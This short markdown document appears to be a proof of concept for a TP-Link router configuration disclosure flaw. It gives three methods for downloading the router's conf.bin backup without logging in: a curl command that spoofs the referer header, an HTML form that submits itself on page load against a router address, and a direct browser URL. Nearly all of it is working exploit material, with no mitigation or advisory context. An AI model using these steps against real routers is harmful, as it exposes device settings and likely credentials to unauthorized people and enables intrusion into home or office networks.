# TP_Link Configuration Disclosure

## 1. using curl
`curl http://<Router ip>/cgi/conf.bin -H 'referer: http://<Router ip>' > conf.bin`
## 2. using html:
```
<form id="autosubmit" action="http://192.168.100.1/cgi/conf.bin" method="GET">
   <input type="hidden" name="referer" value="http://192.168.100.1">
   <input type="submit" value="Submit Request" />
</form>

<script>
 document.getElementById("autosubmit").submit();
</script>
```

## 3. Using Browser:
`http://<Router ip>/cgi/conf.bin?referer=http://<Router ip>/`


# Not all router has same config path

